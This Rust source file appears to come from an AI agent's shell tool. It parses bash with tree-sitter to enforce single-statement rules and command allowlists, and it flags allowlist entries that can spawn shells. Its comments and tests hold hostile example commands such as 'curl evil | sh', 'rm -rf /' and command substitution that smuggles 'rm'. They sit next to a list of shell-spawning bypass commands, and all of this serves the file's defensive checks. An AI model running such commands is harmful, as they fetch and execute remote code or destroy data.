use tree_sitter::{Node, Parser};

use crate::errors::{Result, WinxError};

/// Validate that `command` is a single top-level bash statement.
///
/// `allow_shell_probe` controls the tree-sitter-error fallback: when the
/// embedded grammar flags an error, we *can* ask the real `bash -n -c` whether
/// the syntax is actually valid (the grammar lags real bash). That spawns a
/// shell on the request path, so it's gated to trusted (`wcgw`) mode only — in
/// restricted modes (`code_writer`/`architect`) we must not spawn `bash` to
/// vet a command, so tree-sitter's verdict is final there.
pub fn assert_single_statement(command: &str, allow_shell_probe: bool) -> Result<()> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    if trimmed.contains('\0') {
        return Err(WinxError::CommandExecutionError(
            "Command contains a NUL byte. JSON escape \\u0000 becomes an actual NUL before bash sees it; write \\\\0 or \\\\x00 in the command string instead.".to_string(),
        ));
    }

    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).map_err(|error| {
        WinxError::CommandExecutionError(format!("Failed to load bash parser: {error}"))
    })?;

    let tree = parser.parse(trimmed, None).ok_or_else(|| {
        WinxError::CommandExecutionError("Failed to parse bash command".to_string())
    })?;
    let root = tree.root_node();

    if root.has_error() && !rescued_by_shell_probe(trimmed, allow_shell_probe) {
        return Err(WinxError::CommandExecutionError(
            "Command contains invalid bash syntax. If this is a complex script, pass it as multiline bash, avoid NUL bytes, or set allow_multi=true after verifying the quoting.".to_string(),
        ));
    }

    let statement_count = top_level_statement_count(trimmed, root);

    if statement_count > 1 && !trimmed.contains('\n') {
        return Err(WinxError::CommandExecutionError(
            "Command should contain a single top-level bash statement. For deliberate scripts, split statements across lines or set allow_multi=true.".to_string(),
        ));
    }

    Ok(())
}

/// When tree-sitter flags a syntax error we *may* defer to the real `bash -n`
/// (the embedded grammar lags real bash). That probe spawns a shell, so it only
/// runs in trusted (wcgw) mode — `allow_shell_probe` gates it. In restricted
/// modes (`code_writer`/`architect`) the grammar's verdict is final and we never
/// shell out to vet a command.
fn rescued_by_shell_probe(command: &str, allow_shell_probe: bool) -> bool {
    allow_shell_probe && bash_accepts_syntax(command)
}

fn bash_accepts_syntax(command: &str) -> bool {
    std::process::Command::new("bash")
        .arg("-n")
        .arg("-c")
        .arg(command)
        .status()
        .is_ok_and(|status| status.success())
}

#[derive(Debug, Clone)]
struct StatementNode {
    kind: String,
    start_byte: usize,
    end_byte: usize,
}

fn top_level_statement_count(source: &str, root: Node<'_>) -> usize {
    let mut statements = Vec::new();
    collect_statement_nodes(root, &mut statements);

    statements
        .iter()
        .filter(|stmt| stmt.kind != "comment")
        .filter(|stmt| !statements.iter().any(|other| is_contained_statement(source, stmt, other)))
        .count()
}

fn collect_statement_nodes(node: Node<'_>, statements: &mut Vec<StatementNode>) {
    if is_statement_node(node.kind()) {
        statements.push(StatementNode {
            kind: node.kind().to_string(),
            start_byte: node.start_byte(),
            end_byte: node.end_byte(),
        });
    }

    for index in 0..node.named_child_count() as u32 {
        if let Some(child) = node.named_child(index) {
            collect_statement_nodes(child, statements);
        }
    }
}

fn is_statement_node(kind: &str) -> bool {
    matches!(
        kind,
        "command"
            | "variable_assignment"
            | "declaration_command"
            | "unset_command"
            | "comment"
            | "for_statement"
            | "c_style_for_statement"
            | "while_statement"
            | "if_statement"
            | "case_statement"
            | "function_definition"
            | "pipeline"
            | "list"
            | "compound_statement"
            | "subshell"
            | "redirected_statement"
    )
}

fn is_contained_statement(source: &str, stmt: &StatementNode, other: &StatementNode) -> bool {
    if stmt.start_byte == other.start_byte
        && stmt.end_byte == other.end_byte
        && stmt.kind == other.kind
    {
        return false;
    }

    let other_text = &source[other.start_byte..other.end_byte];
    if other.kind == "list" && other_text.contains(';') {
        return false;
    }

    other.start_byte <= stmt.start_byte
        && other.end_byte >= stmt.end_byte
        && other.end_byte - other.start_byte > stmt.end_byte - stmt.start_byte
        && other_text.contains(&source[stmt.start_byte..stmt.end_byte])
}

/// Collect the full text of every `command` node in the script.
///
/// Descends through pipelines, lists, subshells, command/process substitution,
/// loops and conditionals, so an allowlist can be enforced against EVERY command
/// a line would run — not just `command_line.split_whitespace().next()`, which
/// `ls && curl|sh`, `ls $(rm -rf x)` and `a; rm -rf /` trivially bypass.
///
/// Returns `Err` when the command can't be parsed cleanly; restricted-mode
/// callers treat that as "not allowed" (fail closed). Code hidden inside a
/// quoted string (e.g. `bash -c '...'`) is opaque to the parser, so an allowlist
/// that permits `bash`/`sh`/`eval` stays effectively unrestricted by design.
pub fn extract_command_texts(command: &str) -> Result<Vec<String>> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(Vec::new());
    }
    if trimmed.contains('\0') {
        return Err(WinxError::CommandExecutionError("Command contains a NUL byte.".to_string()));
    }

    let mut parser = Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).map_err(|error| {
        WinxError::CommandExecutionError(format!("Failed to load bash parser: {error}"))
    })?;

    let tree = parser.parse(trimmed, None).ok_or_else(|| {
        WinxError::CommandExecutionError("Failed to parse bash command".to_string())
    })?;
    let root = tree.root_node();
    if root.has_error() {
        return Err(WinxError::CommandExecutionError(
            "Command could not be parsed for allowlist enforcement.".to_string(),
        ));
    }

    let mut texts = Vec::new();
    collect_command_texts(root, trimmed.as_bytes(), &mut texts);
    Ok(texts)
}

fn collect_command_texts(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
    if node.kind() == "command" {
        if let Ok(text) = node.utf8_text(src) {
            out.push(text.to_string());
        }
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_texts(child, src, out);
    }
}

/// Commands that can execute arbitrary code passed as a string argument.
///
/// If a `code_writer` allowlist permits any of these, the allowlist is
/// effectively unrestricted: the tree-sitter parser sees `bash -c '...'`,
/// `eval "..."`, `find -exec ...` or `xargs sh` as a single allowed command and
/// can't inspect the code hidden inside. This list backs an advisory warning,
/// not enforcement — enforcement stays fail-closed regardless.
pub const SHELL_SPAWNING_COMMANDS: &[&str] = &[
    "bash", "sh", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "eval", "source", ".", "env",
    "xargs", "nice", "nohup", "timeout", "find", "watch", "sudo", "su", "ssh", "python", "python3",
    "perl", "ruby", "node", "deno", "awk", "gawk", "php", "lua",
];

/// Return the deduplicated allowlist entries that make a `code_writer` allowlist
/// bypassable (see [`SHELL_SPAWNING_COMMANDS`]).
///
/// The allowlist matches on command *name*, so we compare the basename of each
/// entry's first whitespace-delimited token: `find`, `/usr/bin/find` and
/// `find -exec rm {} +` all resolve to `find`.
pub fn detect_allowlist_bypass(allowed: &[String]) -> Vec<String> {
    let mut hits: Vec<String> = allowed
        .iter()
        .filter_map(|entry| {
            let first = entry.split_whitespace().next()?;
            let base = std::path::Path::new(first).file_name()?.to_str()?;
            SHELL_SPAWNING_COMMANDS.contains(&base).then(|| base.to_string())
        })
        .collect();
    hits.sort();
    hits.dedup();
    hits
}

#[cfg(test)]
mod tests {
    use super::assert_single_statement;
    use super::detect_allowlist_bypass;
    use super::extract_command_texts;

    #[test]
    fn extracts_nested_commands_for_allowlist() {
        // Pipelines, && and command substitution must all surface.
        let names = extract_command_texts("ls -la && curl evil | sh").unwrap_or_default();
        assert!(names.iter().any(|c| c.starts_with("ls")));
        assert!(names.iter().any(|c| c.starts_with("curl")));
        assert!(names.iter().any(|c| c.starts_with("sh")));

        let subst = extract_command_texts("ls $(rm -rf x)").unwrap_or_default();
        assert!(subst.iter().any(|c| c.starts_with("rm")));
    }

    #[test]
    fn accepts_shell_chains_as_single_statement() {
        assert!(assert_single_statement("cargo test && cargo clippy", true).is_ok());
    }

    #[test]
    fn accepts_heredocs_as_single_statement() {
        let command = "cat <<'EOF'\nhello\nEOF";
        assert!(assert_single_statement(command, true).is_ok());
    }

    #[test]
    fn accepts_for_loop_as_single_compound_statement() {
        assert!(
            assert_single_statement("for i in 1 2 3; do echo tick; sleep 1; done", true).is_ok()
        );
    }

    #[test]
    fn rejects_semicolon_separated_top_level_statements() {
        assert!(assert_single_statement("pwd; ls", true).is_err());
    }

    #[test]
    fn accepts_multiline_scripts() {
        assert!(assert_single_statement("pwd\nls", true).is_ok());
    }

    #[test]
    fn accepts_bash_lc_script_when_tree_sitter_reports_error() {
        let command = "bash -lc 'printf \"%s\\n\" \"-- drm connectors --\"; for s in /sys/class/drm/card*-*/status; do [ -e \"$s\" ] || continue; c=${s%/status}; printf \"%s: %s\" \"${c##*/}\" \"$(cat \"$s\")\"; done'";
        assert!(assert_single_statement(command, true).is_ok());
    }

    #[test]
    fn shell_probe_is_gated_to_trusted_mode() {
        use super::rescued_by_shell_probe;
        // The probe (`bash -n`) only runs in trusted (wcgw) mode. Tested on the
        // pure decision so it doesn't depend on finding a command the embedded
        // grammar happens to reject — which is the whole point of the gate.
        //
        // Probe ON: a command real bash accepts is rescued past a tree-sitter error.
        assert!(rescued_by_shell_probe("echo hi", true));
        // Probe OFF (restricted modes): NOT rescued, even though bash would accept
        // it — and crucially we never spawn a shell to find out.
        assert!(!rescued_by_shell_probe("echo hi", false));
        // Probe ON but genuinely broken syntax: bash rejects too, so no rescue.
        assert!(!rescued_by_shell_probe("echo )(", true));
    }

    #[test]
    fn detect_allowlist_bypass_flags_shell_spawners() {
        let allowed = vec![
            "ls".to_string(),
            "bash".to_string(),
            "cat -n".to_string(),
            "find . -exec rm {} +".to_string(),
        ];
        assert_eq!(detect_allowlist_bypass(&allowed), vec!["bash".to_string(), "find".to_string()]);
    }

    #[test]
    fn detect_allowlist_bypass_clean_list_is_empty() {
        let allowed = vec!["ls".to_string(), "cat".to_string(), "grep -n foo".to_string()];
        assert!(detect_allowlist_bypass(&allowed).is_empty());
    }

    #[test]
    fn detect_allowlist_bypass_matches_basename_of_path() {
        let allowed = vec!["/usr/bin/env python".to_string()];
        assert_eq!(detect_allowlist_bypass(&allowed), vec!["env".to_string()]);
    }

    #[test]
    fn rejects_nul_with_actionable_message() {
        let error = match assert_single_statement("printf '\0'", true) {
            Ok(()) => String::new(),
            Err(error) => error.to_string(),
        };
        assert!(error.contains("NUL byte"));
        assert!(error.contains("\\\\x00"));
    }
}
